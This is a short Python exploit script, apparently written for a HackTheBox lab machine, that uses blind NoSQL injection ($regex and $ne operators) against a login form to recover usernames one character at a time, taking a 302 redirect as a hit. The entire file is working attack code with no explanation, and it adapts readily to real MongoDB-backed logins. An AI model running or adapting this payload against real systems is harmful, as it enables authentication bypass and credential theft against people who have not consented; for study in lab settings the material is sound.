#!/usr/bin/python3

import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username=""
password=""
pass_length=12
u="http://staging-order.mango.htb/"
headers={'content-type': 'application/x-www-form-urlencoded'}
proxies={'http':'http://127.0.0.1:8080'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='username[$regex]=^(?!admin)%s&password[$ne]=fakepassword' % (urllib.parse.quote(username + c ))
            r = requests.post(u, data = payload, proxies=proxies, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 302:
                print("Found one more char : %s" % (username+c))
                username += c
